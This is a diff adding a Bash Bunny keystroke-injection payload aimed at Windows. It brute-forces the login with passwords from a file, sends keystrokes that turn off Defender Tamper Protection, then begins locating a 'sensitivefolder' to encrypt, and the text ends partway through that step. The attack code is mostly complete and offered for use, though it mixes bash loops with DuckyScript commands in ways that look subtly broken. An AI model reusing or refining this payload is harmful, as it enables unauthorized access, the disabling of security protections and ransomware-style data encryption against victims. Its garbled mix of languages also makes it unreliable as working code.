@@ -1,0 +1,58 @@
+#!/bin/bash
+
+# Bash Bunny payload to brute-force Windows login with passwords from password.txt
+# Note: Automatic detection of successful login is not possible with keystroke injection alone.
+# This script tries passwords sequentially. To "exit" when found, monitor the screen and unplug the Bunny when login succeeds.
+# Alternatively, limit attempts or add manual intervention.
+
+ATTACKMODE HID
+
+# ATTACK ONE: Loop through each password in the file
+count=0
+sed 's/\r$//' password.txt | while read -r word; do
+    if [ $count -ge 5 ]; then break; fi  # Limit to first 5 attempts for testing
+    # Type the password
+    STRING "$word"
+    # Press Enter
+    ENTER
+    # Wait 2 seconds
+    sleep 2
+    # Optional: Try to open Run dialog (Win+R) to test if logged in
+    GUI r
+    sleep 1
+    count=$((count+1))
+done
+
+# wait for 5 seconds before commencing next attacks
+sleep 5
+
+# ATTACK TWO: Disable Tamper Protection in Windows 10 & 11
+LED STAGE1
+Q GUI s
+Q STRING Virus & threat protection
+Q DELAY 1000
+Q ENTER
+Q DELAY 10000
+Q TAB
+Q TAB
+Q TAB
+Q TAB
+Q ENTER
+Q DELAY 1000
+Q SPACE
+Q DELAY 3000
+Q LEFT
+Q DELAY 1000
+Q ENTER
+Q DELAY 1000
+Q ALT F4
+Q FN ALT F4
+
+# wait for 5 seconds before the next attacks
+sleep 5
+
+# ATTACK THREE: Look for sensitive folder and encrypt
+Q GUI s
+Q STRING sensitivefolder
+Q DELAY 1000
+Q ENTER
